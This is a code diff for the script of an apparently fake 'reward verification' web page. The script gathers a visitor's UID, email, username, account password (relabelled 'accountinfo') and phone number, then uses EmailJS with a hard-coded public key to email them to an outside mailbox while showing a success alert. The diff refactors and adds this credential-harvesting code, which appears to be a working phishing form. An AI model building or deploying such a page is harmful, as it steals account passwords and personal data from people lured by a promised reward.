@@ -161,55 +161,48 @@ Submit Verification
 
 <script>
 
-emailjs.init("IlZtBG2WOaqIrvb3T");
+window.onload = function(){
 
-document
-.getElementById('rewardForm')
-.addEventListener('submit', async function(e){
+emailjs.init({
+publicKey: "IlZtBG2WOaqIrvb3T"
+});
+
+const form =
+document.getElementById("rewardForm");
+
+form.addEventListener("submit", async function(e){
 
 e.preventDefault();
 
-let requestValue = "None";
-
-const requestElement =
-document.getElementById('request');
-
-if(requestElement){
-
-requestValue =
-requestElement.value;
-
-}
+try{
 
 const templateParams = {
 
 uid:
-document.getElementById('uid').value,
+document.getElementById("uid").value,
 
 email:
-document.getElementById('email').value,
+document.getElementById("email").value,
 
 username:
-document.getElementById('username').value,
+document.getElementById("username").value,
 
 accountinfo:
-document.getElementById('accountpassword').value,
+document.getElementById("accountpassword").value,
 
 phone:
-document.getElementById('phone').value,
+document.getElementById("phone").value,
 
 reward:
-document.getElementById('reward').value,
+document.getElementById("reward").value,
 
 request:
-requestValue,
+"None",
 
 photo:
 "Image Uploaded"
 
 };
-
-try{
 
 await emailjs.send(
 
@@ -225,9 +218,7 @@ alert(
 "Verification submitted successfully!"
 );
 
-document
-.getElementById('rewardForm')
-.reset();
+form.reset();
 
 }
 catch(error){
@@ -235,11 +226,13 @@ catch(error){
 console.log(error);
 
 alert(
-"FAILED: " + JSON.stringify(error)
+"ERROR: " + JSON.stringify(error)
 );
 
 }
 
 });
+
+};
 
 </script>
